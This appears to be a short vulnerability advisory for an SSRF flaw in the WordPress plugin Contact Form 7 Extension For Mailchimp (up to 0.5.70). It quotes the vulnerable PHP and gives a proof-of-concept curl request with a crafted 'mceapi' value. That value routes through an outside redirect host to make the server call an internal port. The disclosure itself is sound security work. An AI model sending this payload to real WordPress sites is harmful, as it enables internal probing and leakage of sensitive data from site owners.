### Contact Form 7 Extension For Mailchimp

- **Application**: Contact Form 7 Extension For Mailchimp <= 0.5.70

- **Threat Impact**: Sensitive data leakage

- **Code**:  The API is passed in through `mceapi` POST parameter. The second part after split is used as the host of the URL, which is passed into `callApiGet` and finally used by sink `wp_remote_get`

  File: `lib/find.php`

  ```
  function wpcf7_mce_loadlistas(){
    mceapi = isset($_POST['mceapi']) ? $_POST['mceapi'] : 0;
    ...
    $cf7_mch = $tmppost + array('api' => $mceapi);
    ...
    $api = $cf7_mch['api'];
    $dc = explode("-", $api);
    $urlmcv3 = "https://$dc[1].api.mailchimp.com/3.0";
    ...
    $url_get_merge_fields = "$urlmcv3/lists/$list/merge-fields";  //// $urlmcv3
    $arraymerger_ = callApiGet($dc[0], $url_get_merge_fields);
  }
  
  function callApiGet($token, $url) {
    ...
    $mergerfield = wp_remote_get($url, $header);
  }
  ```
  
- **POC**:
  1. Listen on 8888 on server side
  1. Login to get cookie
  1. Send a post request through curl: `curl -X POST http://127.0.0.1:28000/wp-admin/admin-ajax.php\?action\=wpcf7_mce_loadlistas -d "mceapi=-ssrf.localdomain.pw%2Fcustom%252D30x%2F%3Fcode%3D301%26url%3Dhttp%3A%2F%2F127.0.0.1%3A8888%26a%3D" --cookie "wordpress_cookie"`
  1. Receive a request on server side. 
